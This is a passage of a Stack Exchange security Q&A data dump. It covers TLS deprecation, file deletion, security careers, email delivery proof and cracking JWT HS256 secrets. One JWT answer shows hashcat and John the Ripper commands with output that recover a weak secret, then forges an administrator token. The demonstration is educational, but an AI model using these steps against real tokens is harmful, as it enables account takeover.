<p>It gets more confusing when it mentions &quot;TLS can be embedded in specific packages (e.g. web browsers) because this makes it more of &quot;application-level&quot; approach.
<a href=""https://i.stack.imgur.com/eIO6x.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/eIO6x.png"" alt=""enter image description here"" /></a></p>
","2","3","262477","<p>Let's start by saying that this is a mental model to help you better learn / think about these concepts, which means the usual aphorism applies: <em>&quot;All models are wrong, but some are useful&quot; -- George Box</em>.\</p>
<p>So if the difference between Network / Transport / Application levels are helpful to you, then great, but know that the boundaries are fuzzy and sometimes even wrong, so take it with a grain of salt.</p>
<hr />
<p>Metaphor time!</p>
<p>I am trying to file my taxes by mail.</p>
<p><strong>Network layer:</strong> The postal service.</p>
<p>I put my envelope into a mailbox, a guy picks it up, it goes to a sorting facility and is sorted based on the address on the envelope, it goes out for delivery, it makes it to the destination.</p>
<p>There are some security concerns that are unique to this transport layer; for example could a bad guy pull envelopes out of the mailbox? Could a malicious employee either at the sorting facility or on the delivery route do something bad to your envelope?</p>
<p><strong>Transport layer:</strong> The envelope.</p>
<p>There's the sticky seal. There's the thickness of the paper of the envelope to prevent people reading the contents up against a light. There's the TO: and FROM: addresses on the envelope.</p>
<p>All of these things have potential security abuses associated with them. You could also think of security abuses that have to do with the interactions between the Network and Transport layers; for example messing with the stamp on the envelope or the shape of the envelope might cause it to get sorted differently, which could be abused.</p>
<p><strong>Application layer:</strong> So your envelope gets successfully delivered to the government. They are going to open it and check that the forms inside are filled out properly. They will send you back mail based on whether they accepted your forms ore not.</p>
<p>There are security abuses unique to the application layer, like lying on the forms. You could also think of security abuses that have to do with the interactions between the Application and Transport layers, like writing someone else's From: address on the envelope to try to trick the government into processing the forms incorrectly or sending the response to the wrong place.</p>
<hr />
<p><strong>Summary:</strong> In all cases, a network communication involves two people trying to communicate over some network operated by a 3rd party. Security issues happen when someone can trick one of the parties involved to do something they shouldn't.</p>
<p>This is true in the physical world just as it is in the digital world.</p>
<p>Sometimes thinking of Network vs Transport vs Application will help you keep your thoughts straight, but beyond that there's not much use to models like that.</p>
","1"
"262271","262271","How file deletion works?","<p>If deleting files just removes the references then why not just delete the actual files instead of just removing the references?</p>
<p>Just removing the references leaves the file intact until it is overwritten, but deleting the whole file is better since it makes more space available immediately.</p>
<p>So why are OSes removing the references instead of deleting the entire file?</p>
","0","3","262272","<p>Removing just the reference is faster. It just marks one field on the file metadata to mark it as unused instead of overwriting the entire file. Imagine how slow would it be to overwrite several GB video files instead of just deleting a few bytes on the file information table.</p>
<blockquote>
<p>deleting the whole file is better since it makes more space available immediately.</p>
</blockquote>
<p>It's not how it works. As soon as the file is marked as deleted, the entire space used by that file is marked as free and the space is available immediately.</p>
<blockquote>
<p>So why are OSes removing the references instead of deleting the entire file?</p>
</blockquote>
<p>Performance. In some cases you can force the OS to overwrite the entire file (Linux for example have a <code>shred</code> command for that). It don't guarantee that the entire file will be overwritten (SSD over provisioning can make some sectors of the file still be intact even after overwritting).</p>
","2"
"262271","262271","How file deletion works?","<p>If deleting files just removes the references then why not just delete the actual files instead of just removing the references?</p>
<p>Just removing the references leaves the file intact until it is overwritten, but deleting the whole file is better since it makes more space available immediately.</p>
<p>So why are OSes removing the references instead of deleting the entire file?</p>
","0","3","262276","<p>Disks are not divided into files, they are divided into blocks.  A physical disk doesn't know what a file is at all.</p>
<p>A filesystem adds structure to the disk, including metadata that groups blocks into files.  So you can't delete a file from a disk but you can delete a file from a filesystem.   The way a filesystem deletes a file is to remove its metadata and add the blocks that were used for the file back to the free list.</p>
<p>Just to complicate things, unix makes a subtle distinction between a filename and a file.   A filename is a reference to an inode.  The inode holds the actual metadata for the file and references the blocks.  An inode can have multiple filenames (hard links to the inode) as well as processes that are holding the inode open.  When you delete a filename, the file is not deleted until all of the hard links to the inode are deleted and all processes have closed the file.</p>
<p>To add a security perspective to this, since deleting a file typically just removes the references to the blocks, the file could technically still be recovered.   Practically, once the metadata is gone, it is hard to find the blocks and if you look what is in the free list, no easy way to tell which ones were part of the same file, but it is still possible.  Some operating systems support a &quot;secure delete&quot; mode where blocks are overwritten with zeros before the blocks are returned to the free list.  (Using TRIM (in secure mode) to tell an SSD to return the block to the disk freelist might also work and some filesystems implement this.)</p>
","2"
"262271","262271","How file deletion works?","<p>If deleting files just removes the references then why not just delete the actual files instead of just removing the references?</p>
<p>Just removing the references leaves the file intact until it is overwritten, but deleting the whole file is better since it makes more space available immediately.</p>
<p>So why are OSes removing the references instead of deleting the entire file?</p>
","0","3","262298","<p>On a hard disk drive, you have a bunch of bits, each of which is either one or zero. The bits are never blank. When we say that some storage is blank, we just mean that the ones and zeros there don't encode any meaningful data. When you write to a file, you're setting each bit to a specific state and overriding the previous state. You don't have to erase data before overwriting it with new data and erasing data doesn't make future writes faster. In fact, when you erase data, you're just overwriting all the bits with zeros or some other meaningless data.</p>
<p>On a solid state drive, you do have to erase the storage before writing new data. A properly-configured OS will send commands to the SSD informing it about storage that is no longer used so that the SSD can erase them.</p>
","0"
"262159","262159","Should deprecated versions of TLS not be used","<p>I'm setting up an server, the default configurations allow for connections with deprecated TLS versions. Should I remove deprecated TLS versions from my server? What is the difference between a deprecated and insecure algorithm?</p>
","1","3","262160","<p>It depends on the clients that you expect to be connecting to your server.  If you are fairly sure that most/all of the clients will be modern up-to-date web browsers, then it's safe to enable only TLS 1.3, as TLS 1.3 is supported by all of the major browsers at this point.  But, if some of your clients will be connecting using older tools (such as older versions of <code>wget</code>, <code>curl</code>, the python <code>requests</code> library, etc.), then you may need to enable older version of TLS.  This may be the case if you are running an API endpoint on your server.</p>
","2"
"262159","262159","Should deprecated versions of TLS not be used","<p>I'm setting up an server, the default configurations allow for connections with deprecated TLS versions. Should I remove deprecated TLS versions from my server? What is the difference between a deprecated and insecure algorithm?</p>
","1","3","262162","<p>They most often have been deprecated because they are undeniably insecure, or might be insecure in some configuration. <a href=""https://www.rfc-editor.org/rfc/rfc7568"" rel=""nofollow noreferrer"">RFC 7568</a> and <a href=""https://www.rfc-editor.org/rfc/rfc8996.html"" rel=""nofollow noreferrer"">RFC 8989</a> explains at length why SSLv3, TLS 1.0 and 1.1 got deprecated.</p>
<p>On a new deployment you have no fear of breaking existing functionality for anyone, so it makes sense to not support anything remotely dodgy, as no one can honestly claims to be inconvenienced.</p>
<p>It is often recommended that one uses something like the <a href=""https://ssl-config.mozilla.org/#server=apache&amp;version=2.4.41&amp;config=intermediate&amp;openssl=1.1.1k&amp;guideline=5.6"" rel=""nofollow noreferrer"">Mozilla SSL Configuration Generator</a>
in either the Modern or Intermediate setting to generate a configuration both secure and well interoperable.</p>
","2"
"262159","262159","Should deprecated versions of TLS not be used","<p>I'm setting up an server, the default configurations allow for connections with deprecated TLS versions. Should I remove deprecated TLS versions from my server? What is the difference between a deprecated and insecure algorithm?</p>
","1","3","262188","<p>You should disable versions of TLS older than TLS 1.2 and all versions of SSL.  <a href=""https://www.rfc-editor.org/rfc/rfc7568"" rel=""nofollow noreferrer"">RFC 7568</a> states that you MUST NOT use SSLv3, and <a href=""https://www.rfc-editor.org/rfc/rfc8996"" rel=""nofollow noreferrer"">RFC 8989</a> states that you MUST NOT use TLS 1.0 or 1.1.  The latter is a Best Current Practice, and it would be irresponsible to violate it.</p>
<p>The reason is that all of those versions rely on MD5 and SHA-1, both of which are known to be broken.  In addition, the only ciphers available are RC4, which is broken, and block ciphers in CBC mode using MAC-then-encrypt, which requires careful verification of padding to avoid timing attacks.  It is <em>possible</em> to securely use the CBC mode ciphers if your TLS library extremely carefully checks padding, but MAC-then-encrypt is widely considered a mistake in modern cryptographic design.</p>
<p>In addition, if you are subject to certain types of regulation, such as the PCI standards for sites that accept and process credit cards, you will absolutely be forbidden from using TLS 1.1 or older.  As a consequence, most major sites on the Internet no longer support these versions.  Users who use a browser or user-agent which doesn't at least support TLS 1.2 basically can't access most web sites, and as a result, there are very few such users still around, so there are almost no benefits to doing so.</p>
<p>TLS 1.2 and TLS 1.3 are required for HTTP/2 to be enabled.  Both versions provide modern AEAD algorithms which are both secure and extremely fast (much more so than the legacy TLS cipher suites), and combined with the ability to use HTTP/2, can result in substantially improved performance.</p>
<p>As Bruno Rohée recommended, the <a href=""https://ssl-config.mozilla.org/"" rel=""nofollow noreferrer"">Mozilla SSL Configuration Generator</a> is highly recommended.  In addition, Mozilla makes recommendations on SSH algorithms as well, so you may want to follow those if you'll have an SSH server.</p>
","0"
"262138","262138","What cybersecurity jobs are mostly technical?","<p>I am doing my bachelor's in computer science and I have the chance to take multiple cybersecurity courses. Of course, before taking these course, I did some research about jobs in the field of cybersecurity to see what one does in day-to-day tasks, what paths exist, etc.</p>
<p>I found jobs that seem to mostly do documentation, meetings and reports. I don't see jobs where one only does &quot;technical things&quot;. I will define &quot;technical things&quot; as building servers, configuring firewalls, doing pen testing, writing scripts, etc. In other words, jobs that do not require a lot of interface with people.</p>
<p>For example, if I search for <em>cybersecurity analyst</em> or just <em>cybersecurity</em> (since 90% of the jobs have for title cybersecurity analyst), here are the common tasks that I found between the different jobs:</p>
<ul>
<li><p>Support and promote the various security and compliance policy governance projects.</p>
</li>
<li><p>Contribute to or conduct risk assessments across different projects or incidents.</p>
</li>
<li><p>Teach cybersecurity best practices during interactions with company employees.</p>
</li>
<li><p>Participate in evidence gathering activities for internal and certification audits.</p>
</li>
</ul>
<p>As specialists who work in that field, what are your thoughts about jobs that are only technical?</p>
","6","4","262140","<p>In the field of cybersecurity, technical skills alone are not enough, but it is essential to understand the risks that the technical controls aim to manage. The tasks you mention are likely to include both administrative and technical security, and may focus on either. Customer requirements must be understood, so appointments are necessary. In penetration testing, even the best findings will not lead to anything if you are unable to analyze their significance for the client and report it comprehensibly.</p>
","4"
"262138","262138","What cybersecurity jobs are mostly technical?","<p>I am doing my bachelor's in computer science and I have the chance to take multiple cybersecurity courses. Of course, before taking these course, I did some research about jobs in the field of cybersecurity to see what one does in day-to-day tasks, what paths exist, etc.</p>
<p>I found jobs that seem to mostly do documentation, meetings and reports. I don't see jobs where one only does &quot;technical things&quot;. I will define &quot;technical things&quot; as building servers, configuring firewalls, doing pen testing, writing scripts, etc. In other words, jobs that do not require a lot of interface with people.</p>
<p>For example, if I search for <em>cybersecurity analyst</em> or just <em>cybersecurity</em> (since 90% of the jobs have for title cybersecurity analyst), here are the common tasks that I found between the different jobs:</p>
<ul>
<li><p>Support and promote the various security and compliance policy governance projects.</p>
</li>
<li><p>Contribute to or conduct risk assessments across different projects or incidents.</p>
</li>
<li><p>Teach cybersecurity best practices during interactions with company employees.</p>
</li>
<li><p>Participate in evidence gathering activities for internal and certification audits.</p>
</li>
</ul>
<p>As specialists who work in that field, what are your thoughts about jobs that are only technical?</p>
","6","4","262153","<p>If you want a purely technical role, then there are only a few options. As <a href=""https://security.stackexchange.com/a/262140/6253"">Esa says</a>, every technical role requires some &quot;soft skills&quot; like report writing. And more than that, there are so few cyber security experts that every expert will be asked to do more than their job description.</p>
<p>However, there are a few jobs that are very light on the soft side:</p>
<ul>
<li>malware analysis</li>
<li>data science</li>
<li>and various code analysts</li>
</ul>
","5"
"262138","262138","What cybersecurity jobs are mostly technical?","<p>I am doing my bachelor's in computer science and I have the chance to take multiple cybersecurity courses. Of course, before taking these course, I did some research about jobs in the field of cybersecurity to see what one does in day-to-day tasks, what paths exist, etc.</p>
<p>I found jobs that seem to mostly do documentation, meetings and reports. I don't see jobs where one only does &quot;technical things&quot;. I will define &quot;technical things&quot; as building servers, configuring firewalls, doing pen testing, writing scripts, etc. In other words, jobs that do not require a lot of interface with people.</p>
<p>For example, if I search for <em>cybersecurity analyst</em> or just <em>cybersecurity</em> (since 90% of the jobs have for title cybersecurity analyst), here are the common tasks that I found between the different jobs:</p>
<ul>
<li><p>Support and promote the various security and compliance policy governance projects.</p>
</li>
<li><p>Contribute to or conduct risk assessments across different projects or incidents.</p>
</li>
<li><p>Teach cybersecurity best practices during interactions with company employees.</p>
</li>
<li><p>Participate in evidence gathering activities for internal and certification audits.</p>
</li>
</ul>
<p>As specialists who work in that field, what are your thoughts about jobs that are only technical?</p>
","6","4","262157","<p>If you’re looking for a career in software development, there are many companies that develop cybersecurity tools. These tools are used throughout the cybersecurity world:</p>
<ul>
<li>Endpoint detection systems (anti-virus, data monitoring, etc.)</li>
<li>Network traffic monitoring</li>
<li>XDR engines and rules</li>
<li>Cryptographic services</li>
<li>Code scanning tools (static code analysis, dynamic code analysis, fuzzing, etc.)</li>
<li>CI/CD pipeline security tools</li>
<li>Incident Response tools</li>
<li>Malware analysis</li>
<li>And a thousand other examples I don’t really need to enumerate</li>
</ul>
<p>And every software development organization needs security people to help secure their development processes, pipelines, endpoints, etc. Some of these jobs may be more sysadmin roles, but there is a huge boom in all kinds of security tools and services, and they all need developers.</p>
<p>It might help to attend a local security conference or two. You can see who the players currently are, what they’re selling, and who they’re hiring. It’s a good way to make connections.</p>
","6"
"262138","262138","What cybersecurity jobs are mostly technical?","<p>I am doing my bachelor's in computer science and I have the chance to take multiple cybersecurity courses. Of course, before taking these course, I did some research about jobs in the field of cybersecurity to see what one does in day-to-day tasks, what paths exist, etc.</p>
<p>I found jobs that seem to mostly do documentation, meetings and reports. I don't see jobs where one only does &quot;technical things&quot;. I will define &quot;technical things&quot; as building servers, configuring firewalls, doing pen testing, writing scripts, etc. In other words, jobs that do not require a lot of interface with people.</p>
<p>For example, if I search for <em>cybersecurity analyst</em> or just <em>cybersecurity</em> (since 90% of the jobs have for title cybersecurity analyst), here are the common tasks that I found between the different jobs:</p>
<ul>
<li><p>Support and promote the various security and compliance policy governance projects.</p>
</li>
<li><p>Contribute to or conduct risk assessments across different projects or incidents.</p>
</li>
<li><p>Teach cybersecurity best practices during interactions with company employees.</p>
</li>
<li><p>Participate in evidence gathering activities for internal and certification audits.</p>
</li>
</ul>
<p>As specialists who work in that field, what are your thoughts about jobs that are only technical?</p>
","6","4","262163","<p>I'd suggest that related to the Cyber Security field, but notably not strictly Cyber Security would be Architectural roles such as Network Architect or Identity Architect or more hands on would be a DevOps/DevSecOps Engineer, where Senior/Lead roles will be expected to have a strong security grounding.</p>
<p>p.s. All roles will require people skills, a good rule of thumb being a Senior role will influence their direct team, a Principal their org unit and Head being org wide. But that's something that will likely come with experience.</p>
","2"
"262112","262112","Can I prove that I did not receive an email?","<p>A company are saying they sent an email to me. I have gone through all of my inbox, junk, and deleted files and the email still doesn’t exist. They have asked me to prove the email never got to me by asking my email provider to send over log details but I have looked into this and it is impossible.</p>
<p>Is there any other way to prove an email wasn’t sent to me? Also I have asked them to resend the email but they are saying because the email was automatically generated from an email sent to them they don’t have a copy of the sent email.</p>
","34","5","262116","<p>This is one of those situations where Amazon is asking someone to send a picture proving that a package was never delivered. You can't.</p>
<p>In general, you cannot &quot;prove a negative&quot;.</p>
<p>Trying to get your email provider to supply logs will be difficult and might take a long time. And they might not do it. What will be a lot easier and faster is for the company to <em><strong>check their own email logs</strong></em> for proof that they sent the email. They don't need a copy, just a log entry.</p>
","63"
"262112","262112","Can I prove that I did not receive an email?","<p>A company are saying they sent an email to me. I have gone through all of my inbox, junk, and deleted files and the email still doesn’t exist. They have asked me to prove the email never got to me by asking my email provider to send over log details but I have looked into this and it is impossible.</p>
<p>Is there any other way to prove an email wasn’t sent to me? Also I have asked them to resend the email but they are saying because the email was automatically generated from an email sent to them they don’t have a copy of the sent email.</p>
","34","5","262137","<p>The answer above by <a href=""https://security.stackexchange.com/users/6253/schroeder"">@schroeder</a> is spot-on (+1).  It is impossible for you as the recipient to prove that you didn't receive an email.  However, the sender does have the ability to prove that they sent an email, and that the mail server that handles incoming mail for your domain received it, and that this mail server acknowledged receipt.</p>
<p>The diagram below shows the journey that an email message makes from the sender to the recipient:</p>
<p><a href=""https://i.stack.imgur.com/4PVpA.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/4PVpA.png"" alt=""enter image description here"" /></a></p>
<p>The sender's outgoing SMTP mail server will typically log every delivery attempt.  When the message is handed off from the sender's outgoing SMTP server to the recipient's incoming MX server, the incoming mail server will acknowledge receipt with a <code>2xx</code> response and will usually include a unique identifier that it assigned to the message in this response.  The sender's outgoing SMTP server will typically include all of this in its logs.  So, if there is any question as to whether a message was sent, and whether it was delivered (at least to the recipient's incoming MX server for their domain), this should all be in the sender's outgoing SMTP server logs.</p>
<p>Of course, even if the recipient's incoming MX server received the message, it is still possible that the recipient may not receive the message in their inbox.  This can happen if the recipient's incoming MX server dropped the message, or treated it as spam, or otherwise mishandled the message.  But, at least the sender can show that they sent the message, and that the message made it to the recipient's incoming MX server, and that the recipient's incoming MX server acknowledged receipt of the message.  If the recipient never received the message in their inbox, then the recipient can go to the admin of their incoming MX server, armed with the logs provided by the sender, and ask the admin to track down the missing message, and ask for an explanation.</p>
<p>As you can see, this all hinges on the sender being able to access their outgoing SMTP server logs.  If the sender outsources their outgoing email to a third party provider, it might be difficult to get the provider to pull these log records, as this is typically beyond the level of service that most mail providers offer (at least at the individual/SOHO/SMB level).  However, an outgoing SMTP service such as <a href=""https://www.ultrasmtp.com/"" rel=""noreferrer"">UltraSMTP</a>, makes these <a href=""https://www.ultrasmtp.com/kb/deliverystatus.php"" rel=""noreferrer"">log records available to end users through a self-serve web interface</a>, so that end users can get the information they need themselves to track down problems with non-received messages.  [FD, I am the developer.]</p>
<p><a href=""https://i.stack.imgur.com/oCqXs.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/oCqXs.png"" alt=""enter image description here"" /></a></p>
","19"
"262112","262112","Can I prove that I did not receive an email?","<p>A company are saying they sent an email to me. I have gone through all of my inbox, junk, and deleted files and the email still doesn’t exist. They have asked me to prove the email never got to me by asking my email provider to send over log details but I have looked into this and it is impossible.</p>
<p>Is there any other way to prove an email wasn’t sent to me? Also I have asked them to resend the email but they are saying because the email was automatically generated from an email sent to them they don’t have a copy of the sent email.</p>
","34","5","262144","<p>With @mti2935 already having explained the technical details:</p>
<p>&quot;prove&quot; to which standard? To a forensics level as if it were criminal evidence? Nope, you can't. The old problem of proving a negative. Prove to me that there's not a picture of my cat orbiting Saturn.</p>
<p>But &quot;prove&quot; to the level required to convince some call center agent? Sure. Ask for the exact time they sent the message (if they know they sent it, certainly they can say when, right?) then check your log files around that time. No message received from their address around that time? There's your proof. Snip the log excerpt, black out any info you don't want to share, send it to them and say &quot;you claim you send the mail at XYZ date/time, but as you can see my mail server did not receive a mail from you at or around that time. You may have sent it somewhere else or had some other kind of communication failure.&quot;</p>
<p>TBH, I'm quite sure there's a process to re-send the mail manually. It's just that whoever you're talking to is either too lazy or doesn't know about it.</p>
","4"
"262112","262112","Can I prove that I did not receive an email?","<p>A company are saying they sent an email to me. I have gone through all of my inbox, junk, and deleted files and the email still doesn’t exist. They have asked me to prove the email never got to me by asking my email provider to send over log details but I have looked into this and it is impossible.</p>
<p>Is there any other way to prove an email wasn’t sent to me? Also I have asked them to resend the email but they are saying because the email was automatically generated from an email sent to them they don’t have a copy of the sent email.</p>
","34","5","262174","<p>It is unreasonable to provide logs, unless this is a pre-agreed service. Redacting details for every non-matching entry could be automated but not unless there was a serious business case.</p>
<p>However, depending upon where you work, the email may never truly be deleted, nor silently filtered (is your firm SOX Act compliant?). If it was important to them they should have a receipt or your return (manual) ack response.</p>
<p>They should have a copy with timestamps. But some large blue chips stage their email according to priority and their DEP policies.</p>
<p>Do you use a gmail/hotmail/protonmail address? They may have confused them.</p>
<p>Automatically generated huh? They are not in a good position. Not keeping a copy is effectively the destruction of that information.</p>
","-1"
"262112","262112","Can I prove that I did not receive an email?","<p>A company are saying they sent an email to me. I have gone through all of my inbox, junk, and deleted files and the email still doesn’t exist. They have asked me to prove the email never got to me by asking my email provider to send over log details but I have looked into this and it is impossible.</p>
<p>Is there any other way to prove an email wasn’t sent to me? Also I have asked them to resend the email but they are saying because the email was automatically generated from an email sent to them they don’t have a copy of the sent email.</p>
","34","5","262431","<p>It is possible if both parts can check the logs. If the sender has the QueueID provided by the destination, the problem is with the destination server.  In that case, the sysadmin of the destination can check what happened with the message.</p>
","0"
"262106","262106","Crack JWT HS256 with hashcat","<p>Is it possible to crack a JSON Web Token (JWT) using HS-256 algorithm with <code>hashcat</code> on a normal PC?</p>
<pre><code>hashcat password.txt -m 16500 -a3
</code></pre>
<p>How can I calculate how much time it will take?</p>
<p>JWT first section for example <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code>.</p>
","1","3","262107","<p>I assume you're talking about the <code>HS256</code> algorithm, which uses HMAC-SHA-256.  As <a href=""https://security.stackexchange.com/questions/162324/using-hashcat-to-crack-hmac-sha256"">outlined in this answer</a>, it is possible to use hashcat to attack HMAC-SHA-256.  You'll want to specify the HMAC value using the format specified in RFC 7515, which should be the first two base64-encoded segments with their period separator.</p>
<p>As that question outlines, the format is <code>MAC:message</code>.  The MAC in this case should be hex encoded, so you'll need to base64-decode the third period-separated segment, hex-encode it, and then append a colon and the the first two base64-encoded segments with their period.</p>
<p>However, in my experience, people tend to issue JWTs and other tokens using randomly generated secrets from a CSPRNG with 128 or more bits of entropy.  If the secret was generated that way, then it will be computationally infeasible to crack it.  hashcat will only be effective if the secret is easily guessable, which is not typical.</p>
","1"
"262106","262106","Crack JWT HS256 with hashcat","<p>Is it possible to crack a JSON Web Token (JWT) using HS-256 algorithm with <code>hashcat</code> on a normal PC?</p>
<pre><code>hashcat password.txt -m 16500 -a3
</code></pre>
<p>How can I calculate how much time it will take?</p>
<p>JWT first section for example <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code>.</p>
","1","3","262872","<p><strong>Can it be done <em>in theory</em>?</strong> Yes. You can easily format the JWT's signed parts, and signature, in the format HashCat expects, tell it the algorithm, and then set it to brute-forcing the key.</p>
<p><strong>Is it remotely practical?</strong> Nope. Hashcat is meant for cracking passwords, human-memorable secrets that rarely have more than a 40-50 bits of entropy (and frequently far less). That's not what you're dealing with here.</p>
<p>JWTs are used for machine-to-machine communication, with no need or use for a human to memorize them; as such, they are usually using cryptographically secure random keys with at least 128 bits of entropy (if they aren't, that's probably a vulnerability). Each extra bit doubles the time taken. Each ten extra bits increases the time taken by roughly 1000x. With 80+ more bits than even a good password, it will take Hashcat over 1,000,000,000,000,000,000,000,000 times as long to brute force even just a 128-bit secret key than it would a typical password.</p>
<p>This is actually pretty clear if you think about how JWTs work. JWTs are used all over the web, and other parts of the Internet. They're stateless, meaning the server has no idea what JWTs it has or hasn't issued before. Instead, the server relies 100% on &quot;is this signature valid?&quot; to tell if the JWT was minted legitimately. If an attacker can take any valid JWT (such as one that they just got for signing in), plug it into Hashcat, and get the secret key back... well, that attacker could then forge a JWT claiming to be any user or have any level of privilege, and (re-)sign it with the trusted key. The server would trust that JWT, and the entire authentication and access control protections on the server could be bypassed. This doesn't happen, which logically implies that it's not that easy.</p>
","3"
"262106","262106","Crack JWT HS256 with hashcat","<p>Is it possible to crack a JSON Web Token (JWT) using HS-256 algorithm with <code>hashcat</code> on a normal PC?</p>
<pre><code>hashcat password.txt -m 16500 -a3
</code></pre>
<p>How can I calculate how much time it will take?</p>
<p>JWT first section for example <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</code>.</p>
","1","3","262875","<p>Hashcat allows you to crack multiple formats including the one you mentioned (<code>JWT HS256</code>) and the strength of it relies on the <code>secret</code>.</p>
<p>If the web application is using a strong secret, it can take a very long time to crack. You can optimize the probability of success by building custom dictionaries if you know any additional information about how the secret was generated.</p>
<p>As you do not know how far or close you are of the right answer, it is very hard to know how long will it take to crack it. You can get an estimate time of how long will it take to process a certain dictionary or certain rules.</p>
<p>Here is an example. Let's suppose we have the following JWT HS256:</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNTc0ODM1MzE0LCJleHAiOjE1Nzc0MjczMTR9.GXWX72f5PQi4unRvF3eh6oPziUUr_iVxMyUL5NFlulU
</code></pre>
<p><a href=""https://i.stack.imgur.com/LpBS5.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/LpBS5.png"" alt=""JWT without secret"" /></a></p>
<p>As you can see in the image. It says <code>Invalid Signature</code>, because we do not have the right secret. Now, we will try to crack it by using <code>hashcat</code> and <code>john</code> with the dictionary <code>rockyou.txt</code>.</p>
<p><strong>Hashcat:</strong></p>
<pre><code>jwt_token.txt:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNTc0ODM1MzE0LCJleHAiOjE1Nzc0MjczMTR9.GXWX72f5PQi4unRvF3eh6oPziUUr_iVxMyUL5NFlulU:9897
</code></pre>
<p><strong>Hashcat Command:</strong></p>
<pre><code>┌──(galoget㉿hackem)-[~]
└─$ hashcat -m 16500 -a 0 jwt_token.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.5) starting

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNTc0ODM1MzE0LCJleHAiOjE1Nzc0MjczMTR9.GXWX72f5PQi4unRvF3eh6oPziUUr_iVxMyUL5NFlulU:9897
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaW...NFlulU
Time.Started.....: Tue Jun 18 10:31:04 2022 (15 secs)
Time.Estimated...: Tue Jun 18 10:31:19 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 772.1 kH/s (1.77ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 11528192/14344385 (80.37%)
Rejected.........: 0/11528192 (0.00%)
Restore.Point....: 11526144/14344385 (80.35%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 98io98io -&gt; 989197
Hardware.Mon.#1..: Util: 72%

Started: Tue Jun 18 10:30:03 2022
Stopped: Tue Jun 18 10:31:20 2022
</code></pre>
<p>From the previous output we can see that the <code>secret</code> for this JWT was cracked and its value is: <code>9897</code>.</p>
<p><strong>John The Ripper:</strong></p>
<p>Let's repeat the exercise with <code>john</code>. We will use the same input file from the previous command.</p>
<p><strong>John Command:</strong></p>
<pre><code>┌──(galoget㉿hackem)-[~]
└─$ john jwt_token.txt -w=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9897             (?)     
1g 0:00:00:03 DONE (2022-06-18 10:34) 0.2597g/s 2995Kp/s 2995Kc/s 2995KC/s 98992243..985824
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed. 
</code></pre>
<p>Again, the <code>secret</code> was found with this tool. Now, we can set the secret in the JWT website to verify the signature.</p>
<p><a href=""https://i.stack.imgur.com/wRcpY.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wRcpY.png"" alt=""JWT with the cracked secret"" /></a></p>
<p>We can see that the page shows: <code>Signature Verified</code>, meaning we can forge tokens with it.</p>
<p>For our example we will change the <code>id</code>. Let's assume the web application identifies the user by this <code>id</code>.</p>
<pre><code>id = 2 --&gt; John Doe (Low-privileged User)
id = 1 --&gt; Administrator
</code></pre>
<p>By doing this change, we get the following token:</p>
<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNTc0ODM1MzE0LCJleHAiOjE1Nzc0MjczMTR9.inohRq76BxY5pU3wML1YgiLc6rhs0Dz9fsbZ2DvnOpc
</code></pre>
<p><a href=""https://i.stack.imgur.com/yB3M4.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/yB3M4.png"" alt=""Forged JWT with id 1"" /></a></p>
<p>As you see in this example. The only thing preventing an attacker to take over any account is the secret. If the secret is a random string (Uppercase + lowercase characteres, numbers, symbols). The only mechanism to crack it will be via brute-force or by building a custom dictionary and even with this, it can take from a few seconds to a lot of years, depending on its value.</p>
<p>Hope it helps.</p>
","2"
"262096","262096","Are country IP address blocks officially standardised and can they be reliably used for access control?","<p>I was setting up <a href=""https://en.wikipedia.org/wiki/Firewalld"" rel=""nofollow noreferrer"">firewalld</a> on an enterprise server and came across their concept of firewall zones. I figured I can easily use them and their <code>source</code> property to restrict access to SSH to only the internal network and my home public IP address. Yes, it is not an extremely strong defense, it's just another layer in front of strong mechanisms and most importantly - it helps declutter the logs.</p>
<p>That got me thinking - the server is a mail server that allows users to read their emails over POP3/IMAP and send them using SMTP Submission among other things. These two ports are regularly subjected to automated brute-force attempts. However, since they need to be used by the users from multiple places, I cannot simply whitelist IPs that can access them like I did with the SSH.</p>
